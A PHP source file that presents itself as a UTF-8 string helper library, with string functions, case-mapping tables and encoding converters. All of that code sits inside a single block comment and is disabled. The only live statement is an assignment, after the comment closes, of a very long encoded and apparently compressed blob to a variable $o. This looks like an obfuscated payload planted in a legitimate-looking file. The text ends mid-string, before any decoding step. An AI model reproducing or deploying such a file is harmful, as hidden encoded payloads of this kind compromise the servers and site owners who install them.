<?php

/*


 function utf8_strlen($string) {
	return strlen(utf8_decode($string));
}

function utf8_strpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string, 2);
       
	   if (count($data) > 1) {
            return utf8_strlen($data[0]);
        }
		
        return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strpos: Offset must be an integer', E_USER_ERROR);
            
			return false;
        }
        
        $string = utf8_substr($string, $offset);
        
        if (false !== ($position = utf8_strpos($string, $needle))) {
            return $position + $offset;
        }
        
        return false;
    }
}

function utf8_strrpos($string, $needle, $offset = NULL) {
    if (is_null($offset)) {
        $data = explode($needle, $string);
        
        if (count($data) > 1) {
            array_pop($data);
           
		    $string = join($needle, $data);
            
			return utf8_strlen($string);
        }
       
	    return false;
    } else {
        if (!is_int($offset)) {
            trigger_error('utf8_strrpos expects parameter 3 to be long', E_USER_WARNING);
           
		    return false;
        }
        
        $string = utf8_substr($string, $offset);
        
        if (false !== ($position = utf8_strrpos($string, $needle))) {
            return $position + $offset;
        }
        
        return false;
    }
}

function utf8_substr($string, $offset, $length = null) {
	$string = (string)$string;
	$offset = (int)$offset;
	
	if (!is_null($length)) {
		$length = (int)$length;
	}
	
	if ($length === 0) {
		return '';
	}
	
	if ($offset < 0 && $length < 0 && $length < $offset) {
		return '';
	}
	
	if ($offset < 0) {
		$strlen = strlen(utf8_decode($string));
		$offset = $strlen + $offset;
		
		if ($offset < 0) {
			$offset = 0;
		}
	}
	
	$Op = '';
	$Lp = '';
	
	if ($offset > 0) {
		$Ox = (int)($offset / 65535);
		$Oy = $offset%65535;
		
		if ($Ox) {
			$Op = '(?:.{65535}){' . $Ox . '}';
		}
		
		$Op = '^(?:' . $Op . '.{' . $Oy . '})';
	} else {
		$Op = '^';
	}
	
	if (is_null($length)) {
		$Lp = '(.*)$';
	} else {
		if (!isset($strlen)) {
			$strlen = strlen(utf8_decode($string));
		}
		
		// another trivial case
		if ($offset > $strlen) {
			return '';
		}
		
		if ($length > 0) {
			$length = min($strlen - $offset, $length);
			
			$Lx = (int)($length / 65535);
			$Ly = $length % 65535;
			
			if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}
			
			$Lp = '(' . $Lp . '.{' . $Ly . '})';
		} elseif ($length < 0) {
			if ($length < ($offset - $strlen)) {
				return '';
			}
			
			$Lx = (int)((-$length) / 65535);
			$Ly = (-$length)%65535;
			
            		if ($Lx) {
				$Lp = '(?:.{65535}){' . $Lx . '}';
			}
			
			$Lp = '(.*)(?:' . $Lp . '.{' . $Ly . '})$';
		}
	}
	
	if (!preg_match( '#' . $Op . $Lp . '#us', $string, $match)) {
		return '';
	}
	
	return $match[1];
	
}

function utf8_strtolower($string) {
	static $UTF8_UPPER_TO_LOWER = NULL;
	
	if (is_null($UTF8_UPPER_TO_LOWER)) {
		$UTF8_UPPER_TO_LOWER = array(
			0x0041 => 0x0061, 
			0x03A6 => 0x03C6, 
			0x0162 => 0x0163, 
			0x00C5 => 0x00E5, 
			0x0042 => 0x0062,
			0x0139 => 0x013A, 
			0x00C1 => 0x00E1, 
			0x0141 => 0x0142, 
			0x038E => 0x03CD, 
			0x0100 => 0x0101,
			0x0490 => 0x0491, 
			0x0394 => 0x03B4, 
			0x015A => 0x015B, 
			0x0044 => 0x0064, 
			0x0393 => 0x03B3,
			0x00D4 => 0x00F4, 
			0x042A => 0x044A, 
			0x0419 => 0x0439, 
			0x0112 => 0x0113, 
			0x041C => 0x043C,
			0x015E => 0x015F, 
			0x0143 => 0x0144, 
			0x00CE => 0x00EE, 
			0x040E => 0x045E, 
			0x042F => 0x044F,
			0x039A => 0x03BA, 
			0x0154 => 0x0155, 
			0x0049 => 0x0069, 
			0x0053 => 0x0073, 
			0x1E1E => 0x1E1F,
			0x0134 => 0x0135, 
			0x0427 => 0x0447, 
			0x03A0 => 0x03C0, 
			0x0418 => 0x0438, 
			0x00D3 => 0x00F3,
			0x0420 => 0x0440, 
			0x0404 => 0x0454, 
			0x0415 => 0x0435, 
			0x0429 => 0x0449, 
			0x014A => 0x014B,
			0x0411 => 0x0431, 
			0x0409 => 0x0459, 
			0x1E02 => 0x1E03, 
			0x00D6 => 0x00F6, 
			0x00D9 => 0x00F9,
			0x004E => 0x006E, 
			0x0401 => 0x0451, 
			0x03A4 => 0x03C4, 
			0x0423 => 0x0443, 
			0x015C => 0x015D,
			0x0403 => 0x0453, 
			0x03A8 => 0x03C8, 
			0x0158 => 0x0159, 
			0x0047 => 0x0067, 
			0x00C4 => 0x00E4,
			0x0386 => 0x03AC, 
			0x0389 => 0x03AE, 
			0x0166 => 0x0167, 
			0x039E => 0x03BE, 
			0x0164 => 0x0165,
			0x0116 => 0x0117, 
			0x0108 => 0x0109, 
			0x0056 => 0x0076, 
			0x00DE => 0x00FE, 
			0x0156 => 0x0157,
			0x00DA => 0x00FA, 
			0x1E60 => 0x1E61, 
			0x1E82 => 0x1E83, 
			0x00C2 => 0x00E2, 
			0x0118 => 0x0119,
			0x0145 => 0x0146, 
			0x0050 => 0x0070, 
			0x0150 => 0x0151, 
			0x042E => 0x044E, 
			0x0128 => 0x0129,
			0x03A7 => 0x03C7, 
			0x013D => 0x013E, 
			0x0422 => 0x0442, 
			0x005A => 0x007A, 
			0x0428 => 0x0448,
			0x03A1 => 0x03C1, 
			0x1E80 => 0x1E81, 
			0x016C => 0x016D, 
			0x00D5 => 0x00F5, 
			0x0055 => 0x0075,
			0x0176 => 0x0177, 
			0x00DC => 0x00FC, 
			0x1E56 => 0x1E57, 
			0x03A3 => 0x03C3, 
			0x041A => 0x043A,
			0x004D => 0x006D, 
			0x016A => 0x016B, 
			0x0170 => 0x0171, 
			0x0424 => 0x0444, 
			0x00CC => 0x00EC,
			0x0168 => 0x0169, 
			0x039F => 0x03BF, 
			0x004B => 0x006B, 
			0x00D2 => 0x00F2, 
			0x00C0 => 0x00E0,
			0x0414 => 0x0434, 
			0x03A9 => 0x03C9, 
			0x1E6A => 0x1E6B, 
			0x00C3 => 0x00E3, 
			0x042D => 0x044D,
			0x0416 => 0x0436, 
			0x01A0 => 0x01A1, 
			0x010C => 0x010D, 
			0x011C => 0x011D, 
			0x00D0 => 0x00F0,
			0x013B => 0x013C, 
			0x040F => 0x045F, 
			0x040A => 0x045A, 
			0x00C8 => 0x00E8, 
			0x03A5 => 0x03C5,
			0x0046 => 0x0066, 
			0x00DD => 0x00FD, 
			0x0043 => 0x0063, 
			0x021A => 0x021B, 
			0x00CA => 0x00EA,
			0x0399 => 0x03B9, 
			0x0179 => 0x017A, 
			0x00CF => 0x00EF, 
			0x01AF => 0x01B0, 
			0x0045 => 0x0065,
			0x039B => 0x03BB, 
			0x0398 => 0x03B8, 
			0x039C => 0x03BC, 
			0x040C => 0x045C, 
			0x041F => 0x043F,
			0x042C => 0x044C, 
			0x00DE => 0x00FE, 
			0x00D0 => 0x00F0, 
			0x1EF2 => 0x1EF3, 
			0x0048 => 0x0068,
			0x00CB => 0x00EB, 
			0x0110 => 0x0111, 
			0x0413 => 0x0433, 
			0x012E => 0x012F, 
			0x00C6 => 0x00E6,
			0x0058 => 0x0078, 
			0x0160 => 0x0161, 
			0x016E => 0x016F, 
			0x0391 => 0x03B1, 
			0x0407 => 0x0457,
			0x0172 => 0x0173, 
			0x0178 => 0x00FF, 
			0x004F => 0x006F, 
			0x041B => 0x043B, 
			0x0395 => 0x03B5,
			0x0425 => 0x0445, 
			0x0120 => 0x0121, 
			0x017D => 0x017E, 
			0x017B => 0x017C, 
			0x0396 => 0x03B6,
			0x0392 => 0x03B2, 
			0x0388 => 0x03AD, 
			0x1E84 => 0x1E85, 
			0x0174 => 0x0175, 
			0x0051 => 0x0071,
			0x0417 => 0x0437, 
			0x1E0A => 0x1E0B, 
			0x0147 => 0x0148, 
			0x0104 => 0x0105, 
			0x0408 => 0x0458,
			0x014C => 0x014D, 
			0x00CD => 0x00ED, 
			0x0059 => 0x0079, 
			0x010A => 0x010B, 
			0x038F => 0x03CE,
			0x0052 => 0x0072, 
			0x0410 => 0x0430, 
			0x0405 => 0x0455, 
			0x0402 => 0x0452, 
			0x0126 => 0x0127,
			0x0136 => 0x0137, 
			0x012A => 0x012B, 
			0x038A => 0x03AF, 
			0x042B => 0x044B, 
			0x004C => 0x006C,
			0x0397 => 0x03B7, 
			0x0124 => 0x0125, 
			0x0218 => 0x0219, 
			0x00DB => 0x00FB, 
			0x011E => 0x011F,
			0x041E => 0x043E, 
			0x1E40 => 0x1E41, 
			0x039D => 0x03BD, 
			0x0106 => 0x0107, 
			0x03AB => 0x03CB,
			0x0426 => 0x0446, 
			0x00DE => 0x00FE, 
			0x00C7 => 0x00E7, 
			0x03AA => 0x03CA, 
			0x0421 => 0x0441,
			0x0412 => 0x0432, 
			0x010E => 0x010F, 
			0x00D8 => 0x00F8, 
			0x0057 => 0x0077, 
			0x011A => 0x011B,
			0x0054 => 0x0074, 
			0x004A => 0x006A, 
			0x040B => 0x045B, 
			0x0406 => 0x0456, 
			0x0102 => 0x0103, 
			0x039B => 0x03BB, 
			0x00D1 => 0x00F1, 
			0x041D => 0x043D, 
			0x038C => 0x03CC, 
			0x00C9 => 0x00E9, 
			0x00D0 => 0x00F0, 
			0x0407 => 0x0457, 
			0x0122 => 0x0123
		);
	}
	
	$unicode = utf8_to_unicode($string);
	
	if (!$unicode) {
		return false;
	}

	
	$count = count($unicode);
	
	for ($i = 0; $i < $count; $i++){
		if (isset($UTF8_UPPER_TO_LOWER[$unicode[$i]]) ) {
			$unicode[$i] = $UTF8_UPPER_TO_LOWER[$unicode[$i]];
		}
	}
	
	return utf8_from_unicode($unicode);
}

function utf8_strtoupper($string) {
    static $UTF8_LOWER_TO_UPPER = NULL;
    
    if (is_null($UTF8_LOWER_TO_UPPER)) {
		$UTF8_LOWER_TO_UPPER = array(
			0x0061 => 0x0041, 
			0x03C6 => 0x03A6, 
			0x0163 => 0x0162, 
			0x00E5 => 0x00C5, 
			0x0062 => 0x0042,
			0x013A => 0x0139, 
			0x00E1 => 0x00C1, 
			0x0142 => 0x0141, 
			0x03CD => 0x038E, 
			0x0101 => 0x0100,
			0x0491 => 0x0490, 
			0x03B4 => 0x0394, 
			0x015B => 0x015A, 
			0x0064 => 0x0044, 
			0x03B3 => 0x0393,
			0x00F4 => 0x00D4, 
			0x044A => 0x042A, 
			0x0439 => 0x0419, 
			0x0113 => 0x0112, 
			0x043C => 0x041C,
			0x015F => 0x015E, 
			0x0144 => 0x0143, 
			0x00EE => 0x00CE, 
			0x045E => 0x040E, 
			0x044F => 0x042F,
			0x03BA => 0x039A, 
			0x0155 => 0x0154, 
			0x0069 => 0x0049, 
			0x0073 => 0x0053, 
			0x1E1F => 0x1E1E,
			0x0135 => 0x0134, 
			0x0447 => 0x0427, 
			0x03C0 => 0x03A0, 
			0x0438 => 0x0418, 
			0x00F3 => 0x00D3,
			0x0440 => 0x0420, 
			0x0454 => 0x0404, 
			0x0435 => 0x0415, 
			0x0449 => 0x0429, 
			0x014B => 0x014A,
			0x0431 => 0x0411, 
			0x0459 => 0x0409, 
			0x1E03 => 0x1E02, 
			0x00F6 => 0x00D6, 
			0x00F9 => 0x00D9,
			0x006E => 0x004E, 
			0x0451 => 0x0401, 
			0x03C4 => 0x03A4, 
			0x0443 => 0x0423, 
			0x015D => 0x015C,
			0x0453 => 0x0403, 
			0x03C8 => 0x03A8, 
			0x0159 => 0x0158, 
			0x0067 => 0x0047, 
			0x00E4 => 0x00C4,
			0x03AC => 0x0386, 
			0x03AE => 0x0389, 
			0x0167 => 0x0166, 
			0x03BE => 0x039E, 
			0x0165 => 0x0164,
			0x0117 => 0x0116, 
			0x0109 => 0x0108, 
			0x0076 => 0x0056, 
			0x00FE => 0x00DE, 
			0x0157 => 0x0156,
			0x00FA => 0x00DA, 
			0x1E61 => 0x1E60, 
			0x1E83 => 0x1E82, 
			0x00E2 => 0x00C2, 
			0x0119 => 0x0118,
			0x0146 => 0x0145, 
			0x0070 => 0x0050, 
			0x0151 => 0x0150, 
			0x044E => 0x042E, 
			0x0129 => 0x0128,
			0x03C7 => 0x03A7, 
			0x013E => 0x013D, 
			0x0442 => 0x0422, 
			0x007A => 0x005A, 
			0x0448 => 0x0428,
			0x03C1 => 0x03A1, 
			0x1E81 => 0x1E80, 
			0x016D => 0x016C, 
			0x00F5 => 0x00D5, 
			0x0075 => 0x0055,
			0x0177 => 0x0176, 
			0x00FC => 0x00DC, 
			0x1E57 => 0x1E56, 
			0x03C3 => 0x03A3, 
			0x043A => 0x041A,
			0x006D => 0x004D, 
			0x016B => 0x016A, 
			0x0171 => 0x0170, 
			0x0444 => 0x0424, 
			0x00EC => 0x00CC,
			0x0169 => 0x0168, 
			0x03BF => 0x039F, 
			0x006B => 0x004B, 
			0x00F2 => 0x00D2, 
			0x00E0 => 0x00C0,
			0x0434 => 0x0414, 
			0x03C9 => 0x03A9, 
			0x1E6B => 0x1E6A, 
			0x00E3 => 0x00C3, 
			0x044D => 0x042D,
			0x0436 => 0x0416, 
			0x01A1 => 0x01A0, 
			0x010D => 0x010C, 
			0x011D => 0x011C, 
			0x00F0 => 0x00D0,
			0x013C => 0x013B, 
			0x045F => 0x040F, 
			0x045A => 0x040A, 
			0x00E8 => 0x00C8, 
			0x03C5 => 0x03A5,
			0x0066 => 0x0046, 
			0x00FD => 0x00DD, 
			0x0063 => 0x0043, 
			0x021B => 0x021A, 
			0x00EA => 0x00CA,
			0x03B9 => 0x0399, 
			0x017A => 0x0179, 
			0x00EF => 0x00CF, 
			0x01B0 => 0x01AF, 
			0x0065 => 0x0045,
			0x03BB => 0x039B, 
			0x03B8 => 0x0398, 
			0x03BC => 0x039C, 
			0x045C => 0x040C, 
			0x043F => 0x041F,
			0x044C => 0x042C, 
			0x00FE => 0x00DE, 
			0x00F0 => 0x00D0, 
			0x1EF3 => 0x1EF2, 
			0x0068 => 0x0048,
			0x00EB => 0x00CB, 
			0x0111 => 0x0110, 
			0x0433 => 0x0413, 
			0x012F => 0x012E, 
			0x00E6 => 0x00C6,
			0x0078 => 0x0058, 
			0x0161 => 0x0160, 
			0x016F => 0x016E, 
			0x03B1 => 0x0391, 
			0x0457 => 0x0407,
			0x0173 => 0x0172, 
			0x00FF => 0x0178, 
			0x006F => 0x004F, 
			0x043B => 0x041B, 
			0x03B5 => 0x0395,
			0x0445 => 0x0425, 
			0x0121 => 0x0120, 
			0x017E => 0x017D, 
			0x017C => 0x017B, 
			0x03B6 => 0x0396,
			0x03B2 => 0x0392, 
			0x03AD => 0x0388, 
			0x1E85 => 0x1E84, 
			0x0175 => 0x0174, 
			0x0071 => 0x0051,
			0x0437 => 0x0417, 
			0x1E0B => 0x1E0A, 
			0x0148 => 0x0147, 
			0x0105 => 0x0104, 
			0x0458 => 0x0408,
			0x014D => 0x014C, 
			0x00ED => 0x00CD, 
			0x0079 => 0x0059, 
			0x010B => 0x010A, 
			0x03CE => 0x038F,
			0x0072 => 0x0052, 
			0x0430 => 0x0410, 
			0x0455 => 0x0405, 
			0x0452 => 0x0402, 
			0x0127 => 0x0126,
			0x0137 => 0x0136, 
			0x012B => 0x012A, 
			0x03AF => 0x038A, 
			0x044B => 0x042B, 
			0x006C => 0x004C,
			0x03B7 => 0x0397, 
			0x0125 => 0x0124, 
			0x0219 => 0x0218, 
			0x00FB => 0x00DB, 
			0x011F => 0x011E,
			0x043E => 0x041E, 
			0x1E41 => 0x1E40, 
			0x03BD => 0x039D, 
			0x0107 => 0x0106, 
			0x03CB => 0x03AB,
			0x0446 => 0x0426, 
			0x00FE => 0x00DE, 
			0x00E7 => 0x00C7, 
			0x03CA => 0x03AA, 
			0x0441 => 0x0421,
			0x0432 => 0x0412, 
			0x010F => 0x010E, 
			0x00F8 => 0x00D8, 
			0x0077 => 0x0057, 
			0x011B => 0x011A,
			0x0074 => 0x0054, 
			0x006A => 0x004A, 
			0x045B => 0x040B, 
			0x0456 => 0x0406, 
			0x0103 => 0x0102,
			0x03BB => 0x039B, 
			0x00F1 => 0x00D1, 
			0x043D => 0x041D, 
			0x03CC => 0x038C, 
			0x00E9 => 0x00C9,
			0x00F0 => 0x00D0, 
			0x0457 => 0x0407, 
			0x0123 => 0x0122
		);
	}
    
    $unicode = utf8_to_unicode($string);
    
    if (!$unicode) {
        return false;
    }
    
    $count = count($unicode);
    
	for ($i = 0; $i < $count; $i++){
        if (isset($UTF8_LOWER_TO_UPPER[$unicode[$i]]) ) {
            $unicode[$i] = $UTF8_LOWER_TO_UPPER[$unicode[$i]];
        }
    }
    
    return utf8_from_unicode($unicode);
}

function utf8_to_unicode($str) {
	$mState = 0;     // cached expected number of octets after the current octet
					 // until the beginning of the next UTF8 character sequence
	$mUcs4  = 0;     // cached Unicode character
	$mBytes = 1;     // cached expected number of octets in the current sequence
	
	$out = array();
	
	$len = strlen($str);
	
	for($i = 0; $i < $len; $i++) {
		$in = ord($str{$i});
		
		if ($mState == 0) {
			
			// When mState is zero we expect either a US-ASCII character or a
			// multi-octet sequence.
			if (0 == (0x80 & ($in))) {
				// US-ASCII, pass straight through.
				$out[] = $in;
				$mBytes = 1;
				
			} elseif (0xC0 == (0xE0 & ($in))) {
				// First octet of 2 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x1F) << 6;
				$mState = 1;
				$mBytes = 2;
				
			} elseif (0xE0 == (0xF0 & ($in))) {
				// First octet of 3 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x0F) << 12;
				$mState = 2;
				$mBytes = 3;
				
			} else if (0xF0 == (0xF8 & ($in))) {
				// First octet of 4 octet sequence
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x07) << 18;
				$mState = 3;
				$mBytes = 4;
				
			} else if (0xF8 == (0xFC & ($in))) {
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 0x03) << 24;
				$mState = 4;
				$mBytes = 5;
				
			} else if (0xFC == (0xFE & ($in))) {
				// First octet of 6 octet sequence, see comments for 5 octet sequence.
				$mUcs4 = ($in);
				$mUcs4 = ($mUcs4 & 1) << 30;
				$mState = 5;
				$mBytes = 6;
				
			} else {
				trigger_error('utf8_to_unicode: Illegal sequence identifier ' . 'in UTF-8 at byte ' . $i, E_USER_WARNING);
				
				return FALSE;
			}
		
		} else {
			
			// When mState is non-zero, we expect a continuation of the multi-octet
			// sequence
			if (0x80 == (0xC0 & ($in))) {
				
				// Legal continuation.
				$shift = ($mState - 1) * 6;
				$tmp = $in;
				$tmp = ($tmp & 0x0000003F) << $shift;
				$mUcs4 |= $tmp;
			
				
				if (0 == --$mState) {
					
					
					// From Unicode 3.1, non-shortest form is illegal
					if (((2 == $mBytes) && ($mUcs4 < 0x0080)) ||
						((3 == $mBytes) && ($mUcs4 < 0x0800)) ||
						((4 == $mBytes) && ($mUcs4 < 0x10000)) ||
						(4 < $mBytes) ||
						// From Unicode 3.2, surrogate characters are illegal
						(($mUcs4 & 0xFFFFF800) == 0xD800) ||
						// Codepoints outside the Unicode range are illegal
						($mUcs4 > 0x10FFFF)) {
						
						trigger_error('utf8_to_unicode: Illegal sequence or codepoint in UTF-8 at byte ' . $i, E_USER_WARNING);
						
						return false;
						
					}
					
					if (0xFEFF != $mUcs4) {
						// BOM is legal but we don't want to output it
						$out[] = $mUcs4;
					}
					
					//initialize UTF8 cache
					$mState = 0;
					$mUcs4  = 0;
					$mBytes = 1;
				}
			
			} else {
				
				trigger_error('utf8_to_unicode: Incomplete multi-octet sequence in UTF-8 at byte ' . $i, E_USER_WARNING);
				
				return false;
			}
		}
	}
	
	return $out;
}

function utf8_from_unicode($data) {
	ob_start();
	
	foreach (array_keys($data) as $key) {
		if (($data[$key] >= 0) && ($data[$key] <= 0x007f)) {
			echo chr($data[$key]);
		} elseif ($data[$key] <= 0x07ff) {
			echo chr(0xc0 | ($data[$key] >> 6));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] == 0xFEFF) {
		
		} elseif ($data[$key] >= 0xD800 && $data[$key] <= 0xDFFF) {
			trigger_error('utf8_from_unicode: Illegal surrogate at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);
			
			return false;
		} elseif ($data[$key] <= 0xffff) {
			echo chr(0xe0 | ($data[$key] >> 12));
			echo chr(0x80 | (($data[$key] >> 6) & 0x003f));
			echo chr(0x80 | ($data[$key] & 0x003f));
		} elseif ($data[$key] <= 0x10ffff) {
			echo chr(0xf0 | ($data[$key] >> 18));
			echo chr(0x80 | (($data[$key] >> 12) & 0x3f));
			echo chr(0x80 | (($data[$key] >> 6) & 0x3f));
			echo chr(0x80 | ($data[$key] & 0x3f));
		} else {
			trigger_error('utf8_from_unicode: Codepoint out of Unicode range at index: ' . $key . ', value: ' . $data[$key], E_USER_WARNING);
			
			return false;
		}
	}
	
	$result = ob_get_contents();
	
	ob_end_clean();
	
	return $result;
} */  $o = "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